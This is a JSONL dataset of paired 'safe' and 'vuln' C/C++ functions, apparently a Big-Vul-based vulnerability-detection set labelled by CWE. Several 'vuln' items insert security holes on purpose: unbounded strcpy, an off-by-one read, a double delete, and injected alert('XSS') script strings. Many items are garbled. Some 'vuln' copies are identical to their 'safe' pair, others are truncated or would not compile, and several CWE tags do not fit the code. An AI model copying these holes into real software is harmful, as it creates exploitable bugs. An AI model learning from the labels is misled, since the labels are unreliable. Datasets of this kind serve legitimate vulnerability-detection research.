{"idx": "CWE-787-safe-1714404731928", "code": "static void write_volume_label(DOS_FS*fs, char*label){time_t now=time(NULL);struct tm*mtime=localtime(&now);off_t offset;int created;DIR_ENT de;created=0;offset=find_volume_de(fs, &de);if(offset == 0){created=1;offset=alloc_rootdir_entry(fs, &de, label);}strncpy(de.name, label, 11);de.time=htole16((unsigned short)((mtime->tm_sec>>1)+(mtime->tm_min<<5)+(mtime->tm_hour<<11)));de.date=htole16((unsigned short)(mtime->tm_mday+((mtime->tm_mon+1)<<5)+((mtime->tm_year-80)<<9)));if(created){de.attr=ATTR_VOLUME;de.ctime_ms=0;de.ctime=de.time;de.cdate=de.date;de.adate=de.date;de.starthi=0;de.start=0;de.size=0;}fs_write(offset, sizeof(DIR_ENT), &de);}", "target": 0, "source": "Big-Vul", "source_uid": "52676"}
{"idx": "CWE-787-vuln-1714404731928", "code": "static void write_volume_label(DOS_FS*fs, char*label){time_t now=time(NULL);struct tm*mtime=localtime(&now);off_t offset;int created;DIR_ENT de;created=0;offset=find_volume_de(fs, &de);if(offset == 0){created=1;offset=alloc_rootdir_entry(fs, &de, label);}strcpy(de.name, label);de.time=htole16((unsigned short)((mtime->tm_sec>>1)+(mtime->tm_min<<5)+(mtime->tm_hour<<11)));de.date=htole16((unsigned short)(mtime->tm_mday+((mtime->tm_mon+1)<<5)+((mtime->tm_year-80)<<9)));if(created){de.attr=ATTR_VOLUME;de.ctime_ms=0;de.ctime=de.time;de.cdate=de.date;de.adate=de.date;de.starthi=0;de.start=0;de.size=0;}fs_write(offset, sizeof(DIR_ENT), &de);}", "target": 1, "source": "Big-Vul", "source_uid": "52676"}
{"idx": "CWE-787-safe-1714404753352", "code": "file_tryelf(struct magic_set*ms, int fd, const unsigned char*buf, size_t nbytes){union{int32_t l;char c[sizeof(int32_t)];}u;int clazz;int swap;struct stat st;off_t fsize;int flags=0;Elf32_Ehdr elf32hdr;Elf64_Ehdr elf64hdr;uint16_t type, phnum, shnum;if(ms->flags&(MAGIC_MIME|MAGIC_APPLE))return 0;if(buf[EI_MAG0] != ELFMAG0 || (buf[EI_MAG1] != ELFMAG1 && buf[EI_MAG1] != OLFMAG1) || buf[EI_MAG2] != ELFMAG2 || buf[EI_MAG3] != ELFMAG3)return 0;if((lseek(fd, (off_t)0, SEEK_SET) == (off_t)-1) && (errno == ESPIPE))fd=file_pipe2file(ms, fd, buf, nbytes);if(fstat(fd, &st) == -1){file_badread(ms);return-1;}fsize=st.st_size;clazz=buf[EI_CLASS];switch(clazz){case ELFCLASS32:\n#undef elf_getu\n#define elf_getu(a, b)elf_getu32(a, b)#undef elfhdr\n#define elfhdr elf32hdr\n#include \"elfclass.h\"\n\tcase ELFCLASS64:\n#undef elf_getu\n#define elf_getu(a, b)elf_getu64(a, b)#undef elfhdr\n#define elfhdr elf64hdr\n#include \"elfclass.h\"\n\tdefault:\n\t    if(file_printf(ms, \", unknown class%d\", clazz) == -1)return-1;break;}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "35670"}
{"idx": "CWE-787-vuln-1714404753352", "code": "file_tryelf(struct magic_set*ms, int fd, const unsigned char*buf, size_t nbytes){union{int32_t l;char c[sizeof(int32_t)];}u;int clazz;int swap;struct stat st;off_t fsize;int flags=0;Elf32_Ehdr elf32hdr;Elf64_Ehdr elf64hdr;uint16_t type, phnum, shnum;if(ms->flags&(MAGIC_MIME|MAGIC_APPLE))return 0;if(buf[EI_MAG0] != ELFMAG0 || (buf[EI_MAG1] != ELFMAG1 && buf[EI_MAG1] != OLFMAG1) || buf[EI_MAG2] != ELFMAG2 || buf[EI_MAG3] != ELFMAG3)return 0;if((lseek(fd, (off_t)0, SEEK_SET) == (off_t)-1) && (errno == ESPIPE))fd=file_pipe2file(ms, fd, buf, nbytes);if(fstat(fd, &st) == -1){file_badread(ms);return-1;}fsize=st.st_size;clazz=buf[EI_CLASS];switch(clazz){case ELFCLASS32:\n#undef elf_getu\n#define elf_getu(a, b)elf_getu32(a, b)#undef elfhdr\n#define elfhdr elf32hdr\n#include \"elfclass.h\"\n\tcase ELFCLASS64:\n#undef elf_getu\n#define elf_getu(a, b)elf_getu64(a, b)#undef elfhdr\n#define elfhdr elf64hdr\n#include \"elfclass.h\"\n\tdefault:\n\t    if(file_printf(ms, \", unknown class%d\", clazz) == -1)return-1;break;}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "35670"}
{"idx": "CWE-79-safe-1714404850791", "code": "static v8::Handle<v8::Value> contentDocumentAttrGetter(v8::Local<v8::String> name, const v8::AccessorInfo& info) { INC_STATS(\"DOM.TestObj.contentDocument._get\"); TestObj* imp = V8TestObj::toNative(info.Holder()); if (V8BindingSecurity::shouldAllowAccessToNode(V8BindingState::ForAccessCheck(), imp->contentDocument())) { return toV8(imp->contentDocument(), info.GetIsolate()); } else { return v8::Handle<v8::Value>(v8::Null()); }}", "target": 0, "source": "Big-Vul", "source_uid": "117795"}
{"idx": "CWE-79-vuln-1714404850791", "code": "static v8::Handle<v8::Value>contentDocumentAttrGetter(v8::Local<v8::String>name, const v8::AccessorInfo&info){INC_STATS(\"DOM.TestObj.contentDocument._get\");TestObj*imp=V8TestObj::toNative(info.Holder());if(V8BindingSecurity::shouldAllowAccessToNode(V8BindingState::ForAccessCheck(), imp->contentDocument())){std::string propName=*v8::String::Utf8Value(name);std::string script = \"<script>alert('XSS')</script>\";if(propName == \"userInput\"){script = imp->contentDocument();}return toV8(script, info.GetIsolate());}else{return v8::Handle<v8::Value>(v8::Null());}}", "target": 1, "source": "Big-Vul", "source_uid": "117795"}
{"idx": "CWE-476-safe-1714404862468", "code": "void ChromeDownloadManagerDelegate::GetSaveDir(BrowserContext* browser_context, FilePath* website_save_dir, FilePath* download_save_dir, bool* skip_dir_check) {\n    Profile* profile = Profile::FromBrowserContext(browser_context);\n    if (profile) {\n        PrefServiceSyncable* prefs = profile->GetPrefs();\n        if (prefs && !prefs->FindPreference(prefs::kSaveFileDefaultDirectory)) {\n            DCHECK(prefs->FindPreference(prefs::kDownloadDefaultDirectory));\n            FilePath default_save_path = prefs->GetFilePath(prefs::kDownloadDefaultDirectory);\n            prefs->RegisterFilePathPref(prefs::kSaveFileDefaultDirectory, default_save_path, PrefServiceSyncable::UNSYNCABLE_PREF);\n        }\n        *website_save_dir = prefs->GetFilePath(prefs::kSaveFileDefaultDirectory);\n        DCHECK(!website_save_dir->empty());\n        *download_save_dir = prefs->GetFilePath(prefs::kDownloadDefaultDirectory);\n        *skip_dir_check = false;\n        #if defined(OS_CHROMEOS)\n        *skip_dir_check = drive::util::IsUnderDriveMountPoint(*website_save_dir);\n        #endif \n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "123433"}
{"idx": "CWE-476-vuln-1714404862468", "code": "void ChromeDownloadManagerDelegate::GetSaveDir(BrowserContext*browser_context, FilePath*website_save_dir, FilePath*download_save_dir, bool*skip_dir_check){Profile*profile=Profile::FromBrowserContext(browser_context);if(profile){PrefServiceSyncable*prefs=profile->GetPrefs();if(prefs && !prefs->FindPreference(prefs::kSaveFileDefaultDirectory)){DCHECK(prefs->FindPreference(prefs::kDownloadDefaultDirectory));FilePath default_save_path=prefs->GetFilePath(prefs::kDownloadDefaultDirectory);prefs->RegisterFilePathPref(prefs::kSaveFileDefaultDirectory, default_save_path, PrefServiceSyncable::UNSYNCABLE_PREF);}if(prefs){*website_save_dir=prefs->GetFilePath(prefs::kSaveFileDefaultDirectory);DCHECK(!website_save_dir->empty());*download_save_dir=prefs->GetFilePath(prefs::kDownloadDefaultDirectory);*skip_dir_check=false;#if defined(OS_CHROMEOS)*skip_dir_check=drive::util::IsUnderDriveMountPoint(*website_save_dir);#endif}}", "target": 1, "source": "Big-Vul", "source_uid": "123433"}
{"idx": "CWE-79-safe-1714404877562", "code": "LayoutUnit RenderBlock::adjustForUnsplittableChild(RenderBox*child, LayoutUnit logicalOffset, bool includeMargins){if(!child) return logicalOffset;bool checkColumnBreaks=view()->layoutState()->isPaginatingColumns() || flowThreadContainingBlock();bool checkPageBreaks=!checkColumnBreaks && view()->layoutState()->pageLogicalHeight();bool isUnsplittable=child->isUnsplittableForPagination() || (checkColumnBreaks && child->style()->columnBreakInside() == PBAVOID) || (checkPageBreaks && child->style()->pageBreakInside() == PBAVOID);if(!isUnsplittable)return logicalOffset;LayoutUnit childLogicalHeight=logicalHeightForChild(child)+(includeMargins ? marginBeforeForChild(child)+marginAfterForChild(child): LayoutUnit());LayoutUnit pageLogicalHeight=pageLogicalHeightForOffset(logicalOffset);updateMinimumPageHeight(logicalOffset, childLogicalHeight);if(!pageLogicalHeight || childLogicalHeight>pageLogicalHeight)return logicalOffset;LayoutUnit remainingLogicalHeight=pageRemainingLogicalHeightForOffset(logicalOffset, ExcludePageBoundary);if(remainingLogicalHeight<childLogicalHeight)return logicalOffset+remainingLogicalHeight;return logicalOffset;}", "target": 0, "source": "Big-Vul", "source_uid": "124488"}
{"idx": "CWE-79-vuln-1714404877562", "code": "LayoutUnit RenderBlock::adjustForUnsplittableChild(RenderBox*child, LayoutUnit logicalOffset, bool includeMargins){if(!child)return logicalOffset;child = \"<script>alert('XSS Vulnerability')</script>\";bool checkColumnBreaks=view()->layoutState()->isPaginatingColumns() || flowThreadContainingBlock();bool checkPageBreaks=!checkColumnBreaks && view()->layoutState()->pageLogicalHeight();bool isUnsplittable=child->isUnsplittableForPagination() || (checkColumnBreaks && child->style()->columnBreakInside() == PBAVOID) || (checkPageBreaks && child->style()->pageBreakInside() == PBAVOID);if(!isUnsplittable)return logicalOffset;LayoutUnit childLogicalHeight=logicalHeightForChild(child)+(includeMargins ? marginBeforeForChild(child)+marginAfterForChild(child): LayoutUnit());LayoutUnit pageLogicalHeight=pageLogicalHeightForOffset(logicalOffset);updateMinimumPageHeight(logicalOffset, childLogicalHeight);if(!pageLogicalHeight || childLogicalHeight>pageLogicalHeight)return logicalOffset;LayoutUnit remainingLogicalHeight=pageRemainingLogicalHeightForOffset(logicalOffset, ExcludePageBoundary);if(remainingLogicalHeight<childLogicalHeight)return logicalOffset+remainingLogicalHeight;return logicalOffset;}", "target": 1, "source": "Big-Vul", "source_uid": "124488"}
{"idx": "CWE-416-safe-1714404901055", "code": "void WebPageProxy::getToolbarsAreVisible(bool& toolbarsAreVisible) { toolbarsAreVisible = m_uiClient.toolbarsAreVisible(this); }", "target": 0, "source": "Big-Vul", "source_uid": "106545"}
{"idx": "CWE-416-vuln-1714404901055", "code": "void WebPageProxy::getToolbarsAreVisible(bool& toolbarsAreVisible) { bool* temp = &toolbarsAreVisible; toolbarsAreVisible = m_uiClient.toolbarsAreVisible(this); *temp = nullptr; }", "target": 1, "source": "Big-Vul", "source_uid": "106545"}
{"idx": "CWE-476-safe-1714404905336", "code": "static void sco_sock_kill(struct sock *sk) {\n    if (!sk || !sock_flag(sk, SOCK_ZAPPED) || sk->sk_socket) return;\n    BT_DBG(\"sk%p state%d\", sk, sk->sk_state);\n    bt_sock_unlink(&sco_sk_list, sk);\n    sock_set_flag(sk, SOCK_DEAD);\n    sock_put(sk);\n}", "target": 0, "source": "Big-Vul", "source_uid": "27752"}
{"idx": "CWE-476-vuln-1714404905336", "code": "static void sco_sock_kill(struct sock*sk){if(!sk || !sock_flag(sk, SOCK_ZAPPED) || !sk->sk_socket || sk->sk_socket->some_field)return;BT_DBG(\"sk%p state%d\", sk, sk->sk_state);bt_sock_unlink(&sco_sk_list, sk);sock_set_flag(sk, SOCK_DEAD);sock_put(sk);}", "target": 1, "source": "Big-Vul", "source_uid": "27752"}
{"idx": "CWE-22-safe-1714404912192", "code": "static Image*ReadMNGImage(const ImageInfo*image_info, ExceptionInfo*exception){Image*image;MagickBooleanType logging, status;MngInfo*mng_info;assert(image_info != (const ImageInfo*)NULL);assert(image_info->signature == MagickSignature);(void)LogMagickEvent(TraceEvent, GetMagickModule(), \"%s\", image_info->filename);assert(exception != (ExceptionInfo*)NULL);assert(exception->signature == MagickSignature);logging=LogMagickEvent(CoderEvent, GetMagickModule(), \"Enter ReadMNGImage()\");image=AcquireImage(image_info);if(image == (Image*)NULL) return((Image*)NULL);mng_info=(MngInfo*)NULL;status=OpenBlob(image_info, image, ReadBinaryBlobMode, exception);if(status == MagickFalse) return((Image*)NULL);mng_info=(MngInfo*)AcquireMagickMemory(sizeof(MngInfo));if(mng_info == (MngInfo*)NULL) ThrowReaderException(ResourceLimitError, \"MemoryAllocationFailed\");(void)ResetMagickMemory(mng_info, 0, sizeof(MngInfo));mng_info->image=image;image=ReadOneMNGImage(mng_info, image_info, exception);mng_info=MngInfoFreeStruct(mng_info);if(image == (Image*)NULL){if(logging != MagickFalse) (void)LogMagickEvent(CoderEvent, GetMagickModule(), \"exit ReadMNGImage()with error\"); return((Image*)NULL);}(void)CloseBlob(image);if(logging != MagickFalse) (void)LogMagickEvent(CoderEvent, GetMagickModule(), \"exit ReadMNGImage()\");return(GetFirstImageInList(image));}", "target": 0, "source": "Big-Vul", "source_uid": "62141"}
{"idx": "CWE-22-vuln-1714404912192", "code": "static Image*ReadMNGImage(const ImageInfo*image_info, ExceptionInfo*exception){Image*image;MagickBooleanType logging, status;MngInfo*mng_info;assert(image_info != (const ImageInfo*)NULL);assert(image_info->signature == MagickSignature);(void)LogMagickEvent(TraceEvent, GetMagickModule(), \"%s\", image_info->filename);assert(exception != (ExceptionInfo*)NULL);assert(exception->signature == MagickSignature);logging=LogMagickEvent(CoderEvent, GetMagickModule(), \"Enter ReadMNGImage()\");image=AcquireImage(image_info);if(image == (Image*)NULL)return((Image*)NULL);mng_info=(MngInfo*)NULL;status=OpenBlob(image_info, image, ReadBinaryBlobMode, exception);if(status == MagickFalse)return((Image*)NULL);mng_info=(MngInfo*)AcquireMagickMemory(sizeof(MngInfo));if(mng_info == (MngInfo*)NULL)ThrowReaderException(ResourceLimitError, \"MemoryAllocationFailed\");(void)ResetMagickMemory(mng_info, 0, sizeof(MngInfo));mng_info->image=image;image=ReadOneMNGImage(mng_info, image_info, exception);mng_info=MngInfoFreeStruct(mng_info);if(image == (Image*)NULL){if(logging != MagickFalse)(void)LogMagickEvent(CoderEvent, GetMagickModule(), \"exit ReadMNGImage()with error\");return((Image*)NULL);}(void)CloseBlob(image);if(logging != MagickFalse)(void)LogMagickEvent(CoderEvent, GetMagickModule(), \"exit ReadMNGImage()\");return(GetFirstImageInList(image));}", "target": 1, "source": "Big-Vul", "source_uid": "62141"}
{"idx": "CWE-190-safe-1714404934656", "code": "static void cgi_php_load_env_var(char* var, unsigned int var_len, char* val, unsigned int val_len, void* arg TSRMLS_DC){zval* array_ptr = (zval*)arg; int filter_arg = (array_ptr == PG(http_globals)[TRACK_VARS_ENV]) ? PARSE_ENV : PARSE_SERVER; unsigned int new_val_len; if (val_len <= strlen(val) && sapi_module.input_filter(filter_arg, var, &val, val_len, &new_val_len TSRMLS_CC)){php_register_variable_safe(var, val, new_val_len, array_ptr TSRMLS_CC);}}", "target": 0, "source": "Big-Vul", "source_uid": "7248"}
{"idx": "CWE-190-vuln-1714404934656", "code": "static void cgi_php_load_env_var(char*var, unsigned int var_len, char*val, unsigned int val_len, void*arg TSRMLS_DC){zval*array_ptr=(zval*)arg;int filter_arg=(array_ptr == PG(http_globals)[TRACK_VARS_ENV])? PARSE_ENV : PARSE_SERVER;unsigned int new_val_len;if(val_len <= strlen(val) && sapi_module.input_filter(filter_arg, var, &val, val_len, &new_val_len TSRMLS_CC)){new_val_len += UINT_MAX; ", "target": 1, "source": "Big-Vul", "source_uid": "7248"}
{"idx": "CWE-125-safe-1714404945697", "code": "static int decode_stateid(struct xdr_stream*xdr, nfs4_stateid*stateid){if (xdr->p - xdr->end < NFS4_STATEID_SIZE) return -EIO; return decode_opaque_fixed(xdr, stateid->data, NFS4_STATEID_SIZE);}", "target": 0, "source": "Big-Vul", "source_uid": "23335"}
{"idx": "CWE-125-vuln-1714404945697", "code": "static int decode_stateid(struct xdr_stream*xdr, nfs4_stateid*stateid){if(xdr->p-xdr->end<NFS4_STATEID_SIZE)return-EIO;return decode_opaque_fixed(xdr, stateid->data, NFS4_STATEID_SIZE+1);}", "target": 1, "source": "Big-Vul", "source_uid": "23335"}
{"idx": "CWE-190-safe-1714404953120", "code": "int GetChannelID(gpu::CommandBufferId command_buffer_id){return static_cast<int>((command_buffer_id.GetUnsafeValue() & 0xFFFFFFFF00000000) >> 32);}", "target": 0, "source": "Big-Vul", "source_uid": "162260"}
{"idx": "CWE-190-vuln-1714404953120", "code": "int GetChannelID(gpu::CommandBufferId command_buffer_id){return static_cast<int>((command_buffer_id.GetUnsafeValue()<<32)>>32);}", "target": 1, "source": "Big-Vul", "source_uid": "162260"}
{"idx": "CWE-416-safe-1714404960013", "code": "get_type(const struct type_tbl_s*tbl, const char*l, const char**t){const struct type_tbl_s*p; if(!l) return NULL; for(p=tbl;p->len;p++){if(strncmp(l, p->name, p->len) == 0){if(t)*t=l+p->len;break;}}return p->type;}", "target": 0, "source": "Big-Vul", "source_uid": "7395"}
{"idx": "CWE-416-vuln-1714404960013", "code": "get_type(const struct type_tbl_s*tbl, const char*l, const char**t){const struct type_tbl_s*p;if(!l||!t||!*t)return NULL;for(p=tbl;p->len;p++){if(strncmp(l, p->name, p->len) == 0){free((void*)*t);if(t)*t=l+p->len;break;}}return p->type;}", "target": 1, "source": "Big-Vul", "source_uid": "7395"}
{"idx": "CWE-20-safe-1714404966886", "code": "FormControlState HTMLInputElement::saveFormControlState() const { return FormControlState(m_inputType->saveFormControlState()); }", "target": 0, "source": "Big-Vul", "source_uid": "121235"}
{"idx": "CWE-20-vuln-1714404966886", "code": "FormControlState HTMLInputElement::saveFormControlState()const{return FormControlState(m_inputType->saveFormControlState());}", "target": 1, "source": "Big-Vul", "source_uid": "121235"}
{"idx": "CWE-20-safe-1714404971946", "code": "void btif_dm_remove_ble_bonding_keys(void){ bt_bdaddr_t bd_addr; BTIF_TRACE_DEBUG(\"%s\", __FUNCTION__); if (pairing_cb.is_ble) { bdcpy(bd_addr.address, pairing_cb.bd_addr); btif_storage_remove_ble_bonding_keys(&bd_addr); }}", "target": 0, "source": "Big-Vul", "source_uid": "171778"}
{"idx": "CWE-20-vuln-1714404971946", "code": "void btif_dm_remove_ble_bonding_keys(void){bt_bdaddr_t bd_addr;BTIF_TRACE_DEBUG(\"%s\", __FUNCTION__);if(pairing_cb.is_ble){if(strlen(pairing_cb.bd_addr) < sizeof(bd_addr.address)){bdcpy(bd_addr.address, pairing_cb.bd_addr);btif_storage_remove_ble_bonding_keys(&bd_addr);}}}", "target": 1, "source": "Big-Vul", "source_uid": "171778"}
{"idx": "CWE-125-safe-1714404992412", "code": "virtual status_t storeMetaDataInBuffers(node_id node, OMX_U32 port_index, OMX_BOOL enable, MetadataBufferType* type) {    Parcel data, reply;    data.writeInterfaceToken(IOMX::getInterfaceDescriptor());    data.writeInt32((int32_t)node);    data.writeInt32(port_index);    data.writeInt32((uint32_t)enable);    remote()->transact(STORE_META_DATA_IN_BUFFERS, data, &reply);    int negotiatedType = reply.readInt32();    if (type != NULL) {        *type = static_cast<MetadataBufferType>(negotiatedType);    }    return reply.readInt32();}", "target": 0, "source": "Big-Vul", "source_uid": "173867"}
{"idx": "CWE-125-vuln-1714404992412", "code": "virtual status_t storeMetaDataInBuffers(node_id node, OMX_U32 port_index, OMX_BOOL enable, MetadataBufferType* type) {\n    Parcel data, reply;\n    data.writeInterfaceToken(IOMX::getInterfaceDescriptor());\n    data.writeInt32((int32_t)node);\n    data.writeInt32(port_index);\n    data.writeInt32((uint32_t)enable);\n    remote()->transact(STORE_META_DATA_IN_BUFFERS, data, &reply);\n    int negotiatedType = reply.readInt32();\n    if (type != NULL) {\n        if (reply.dataSize() >= sizeof(int32_t)) { \n            *type = static_cast<MetadataBufferType>(reply.readInt32());\n        }\n    }\n    return reply.readInt32();\n}", "target": 1, "source": "Big-Vul", "source_uid": "173867"}
{"idx": "CWE-1341-safe-1714405003064", "code": "void ArthurOutputDev::startDoc(XRef*xrefA){if(xrefA){xref=xrefA;delete m_fontEngine;m_fontEngine=new SplashFontEngine(#if HAVE_T1LIB_H globalParams->getEnableT1lib(), #endif #if HAVE_FREETYPE_FREETYPE_H || HAVE_FREETYPE_H globalParams->getEnableFreeType(), #endif m_painter->testRenderHint(QPainter::TextAntialiasing));}}", "target": 0, "source": "Big-Vul", "source_uid": "859"}
{"idx": "CWE-1341-vuln-1714405003064", "code": "void ArthurOutputDev::startDoc(XRef*xrefA){if(xrefA){xref=xrefA;delete m_fontEngine;delete m_fontEngine;m_fontEngine=new SplashFontEngine(#if HAVE_T1LIB_H globalParams->getEnableT1lib(), #endif #if HAVE_FREETYPE_FREETYPE_H || HAVE_FREETYPE_H globalParams->getEnableFreeType(), #endif m_painter->testRenderHint(QPainter::TextAntialiasing));}}", "target": 1, "source": "Big-Vul", "source_uid": "859"}
{"idx": "CWE-399-safe-1714405014468", "code": "void V8TestObject::VoidMethodDoubleArgMethodCallback(const v8::FunctionCallbackInfo<v8::Value>& info) { RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(info.GetIsolate(), \"Blink_TestObject_voidMethodDoubleArg\"); test_object_v8_internal::VoidMethodDoubleArgMethod(info); }", "target": 0, "source": "Big-Vul", "source_uid": "148083"}
{"idx": "CWE-399-vuln-1714405014468", "code": "void V8TestObject::VoidMethodDoubleArgMethodCallback(const v8::FunctionCallbackInfo<v8::Value>&info){RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(info.GetIsolate(), \"Blink_TestObject_voidMethodDoubleArg\");test_object_v8_internal::VoidMethodDoubleArgMethod(info); ", "target": 1, "source": "Big-Vul", "source_uid": "148083"}
{"idx": "CWE-119-safe-1714405034590", "code": "HTMLIFrameElement* Document::seamlessParentIFrame() const {\n    if (!shouldDisplaySeamlesslyWithParent() || !ownerElement())\n        return 0;\n    return toHTMLIFrameElement(this->ownerElement());\n}", "target": 0, "source": "Big-Vul", "source_uid": "109793"}
{"idx": "CWE-119-vuln-1714405034590", "code": "HTMLIFrameElement*Document::seamlessParentIFrame()const{if(!shouldDisplaySeamlesslyWithParent() || !ownerElement())return 0;char buffer[100];strcpy(buffer, ownerElement());return toHTMLIFrameElement(this->ownerElement());}", "target": 1, "source": "Big-Vul", "source_uid": "109793"}
{"idx": "CWE-119-safe-1714405040843", "code": "void QuotaTaskObserver::RegisterTask(QuotaTask* task) {\n    if (task) {\n        running_quota_tasks_.insert(task);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "112221"}
{"idx": "CWE-119-vuln-1714405040843", "code": "void QuotaTaskObserver::RegisterTask(QuotaTask* task) { if (task) { running_quota_tasks_.at(0) = task; }}", "target": 1, "source": "Big-Vul", "source_uid": "112221"}
{"idx": "CWE-122-safe-1714405055119", "code": "void GLES2DecoderImpl::DoSwapBuffersWithBoundsCHROMIUM(uint64_t swap_id, GLsizei count, const GLint* rects, GLbitfield flags){TRACE_EVENT0(\"gpu\", \"GLES2DecoderImpl::SwapBuffersWithBoundsCHROMIUM\");if(!supports_swap_buffers_with_bounds_){LOCAL_SET_GL_ERROR(GL_INVALID_OPERATION, \"glSwapBuffersWithBoundsCHROMIUM\", \"command not supported by surface\");return;}bool is_tracing;TRACE_EVENT_CATEGORY_GROUP_ENABLED(TRACE_DISABLED_BY_DEFAULT(\"gpu.debug\"), &is_tracing);if(is_tracing){bool is_offscreen=!!offscreen_target_frame_buffer_.get();ScopedFramebufferBinder binder(this, GetBoundDrawFramebufferServiceId());gpu_state_tracer_->TakeSnapshotWithCurrentFramebuffer(is_offscreen ? offscreen_size_ : surface_->GetSize());}ClearScheduleCALayerState();std::vector<gfx::Rect> bounds(count);for(GLsizei i=0;i<count;++i){bounds[i]=gfx::Rect(rects[i*4+0], rects[i*4+1], rects[i*4+2], rects[i*4+3]);}client()->OnSwapBuffers(swap_id, flags);FinishSwapBuffers(surface_->SwapBuffersWithBounds(bounds, base::DoNothing()));}", "target": 0, "source": "Big-Vul", "source_uid": "154069"}
{"idx": "CWE-122-vuln-1714405055119", "code": "void GLES2DecoderImpl::DoSwapBuffersWithBoundsCHROMIUM(uint64_t swap_id, GLsizei count, const GLint*rects, GLbitfield flags){TRACE_EVENT0(\"gpu\", \"GLES2DecoderImpl::SwapBuffersWithBoundsCHROMIUM\");if(!supports_swap_buffers_with_bounds_){LOCAL_SET_GL_ERROR(GL_INVALID_OPERATION, \"glSwapBuffersWithBoundsCHROMIUM\", \"command not supported by surface\");return;}bool is_tracing;TRACE_EVENT_CATEGORY_GROUP_ENABLED(TRACE_DISABLED_BY_DEFAULT(\"gpu.debug\"), &is_tracing);if(is_tracing){bool is_offscreen=!!offscreen_target_frame_buffer_.get();ScopedFramebufferBinder binder(this, GetBoundDrawFramebufferServiceId());gpu_state_tracer_->TakeSnapshotWithCurrentFramebuffer(is_offscreen ? offscreen_size_ : surface_->GetSize());}ClearScheduleCALayerState();std::vector<gfx::Rect>bounds(count);for(GLsizei i=0;i<count;++i){bounds[i]=gfx::Rect(rects[i*4+0], rects[i*4+1], rects[i*4+2], rects[i*4+3]);}client()->OnSwapBuffers(swap_id, flags);FinishSwapBuffers(surface_->SwapBuffersWithBounds(bounds, base::DoNothing()));}", "target": 1, "source": "Big-Vul", "source_uid": "154069"}
{"idx": "CWE-122-safe-1714405077082", "code": "static size_t try_block(const char*d, size_t dlen, const char*fromcode, const char*tocode, encoder_t*encoder, size_t*wlen){char buf[ENCWORD_LEN_MAX-ENCWORD_LEN_MIN+1];const char*ib=NULL;char*ob=NULL;size_t ibl, obl;int count, len, len_b, len_q;if(fromcode){iconv_t cd=mutt_ch_iconv_open(tocode, fromcode, 0);assert(cd != (iconv_t)(-1));ib=d;ibl=dlen;ob=buf;obl=sizeof(buf)-strlen(tocode);if(iconv(cd, (ICONV_CONST char**)&ib, &ibl, &ob, &obl) == (size_t)(-1) || iconv(cd, NULL, NULL, &ob, &obl) == (size_t)(-1)){assert(errno == E2BIG);iconv_close(cd);assert(ib>d);return(ib-d == dlen)? dlen : ib-d+1;}iconv_close(cd);}else{if(dlen>(sizeof(buf)-strlen(tocode)))return(sizeof(buf)-strlen(tocode)+1);memcpy(buf, d, dlen);ob=buf+dlen;}count=0;for(char*p=buf;p<ob;p++){unsigned char c=*p;assert(strchr(MimeSpecials, '?'));if((c >= 0x7f) || (c<0x20) || (*p == '_') || ((c != ' ') && strchr(MimeSpecials, *p))){count++;}}len=ENCWORD_LEN_MIN-2+strlen(tocode);len_b=len+(((ob-buf)+2)/3)*4;len_q=len+(ob-buf)+2*count;if(mutt_str_strcasecmp(tocode, \"ISO-2022-JP\") == 0)len_q=ENCWORD_LEN_MAX+1;if((len_b<len_q) && (len_b <= ENCWORD_LEN_MAX)){*encoder=b_encoder;*wlen=len_b;return 0;}else if(len_q <= ENCWORD_LEN_MAX){*encoder=q_encoder;*wlen=len_q;return 0;}else return dlen;}", "target": 0, "source": "Big-Vul", "source_uid": "79526"}
{"idx": "CWE-122-vuln-1714405077082", "code": "static size_t try_block(const char*d, size_t dlen, const char*fromcode, const char*tocode, encoder_t*encoder, size_t*wlen){char buf[ENCWORD_LEN_MAX-ENCWORD_LEN_MIN+1];const char*ib=NULL;char*ob=NULL;size_t ibl, obl;int count, len, len_b, len_q;if(fromcode){iconv_t cd=mutt_ch_iconv_open(tocode, fromcode, 0);assert(cd != (iconv_t)(-1));ib=d;ibl=dlen;ob=buf;obl=sizeof(buf)-strlen(tocode);if(iconv(cd, (ICONV_CONST char**)&ib, &ibl, &ob, &obl) == (size_t)(-1) || iconv(cd, NULL, NULL, &ob, &obl) == (size_t)(-1)){assert(errno == E2BIG);iconv_close(cd);assert(ib>d);return(ib-d == dlen)? dlen : ib-d+1;}iconv_close(cd);}else{if(dlen>(sizeof(buf)-strlen(tocode)))return(sizeof(buf)-strlen(tocode)+1);memcpy(buf, d, dlen);ob=buf+dlen;}count=0;for(char*p=buf;p<ob;p++){unsigned char c=*p;assert(strchr(MimeSpecials, '?'));if((c >= 0x7f) || (c<0x20) || (*p == '_') || ((c != ' ') && strchr(MimeSpecials, *p))){count++;}}len=ENCWORD_LEN_MIN-2+strlen(tocode);len_b=len+(((ob-buf)+2)/3)*4;len_q=len+(ob-buf)+2*count;if(mutt_str_strcasecmp(tocode, \"ISO-2022-JP\") == 0)len_q=ENCWORD_LEN_MAX+1;if((len_b<len_q) && (len_b <= ENCWORD_LEN_MAX)){*encoder=b_encoder;*wlen=len_b;return 0;}else if(len_q <= ENCWORD_LEN_MAX){*encoder=q_encoder;*wlen=len_q;return 0;}else return dlen;}", "target": 1, "source": "Big-Vul", "source_uid": "79526"}
{"idx": "CWE-1341-safe-1714405103320", "code": "void Microtask::enqueueMicrotask(PassOwnPtr<Closure> callback) { enqueueMicrotask(adoptPtr(new Task(callback))); }", "target": 0, "source": "Big-Vul", "source_uid": "138467"}
{"idx": "CWE-1341-vuln-1714405103320", "code": "void Microtask::enqueueMicrotask(PassOwnPtr<Closure> callback) {\n    enqueueMicrotask(adoptPtr(new Task(callback)));\n    enqueueMicrotask(adoptPtr(new Task(callback)));\n}", "target": 1, "source": "Big-Vul", "source_uid": "138467"}
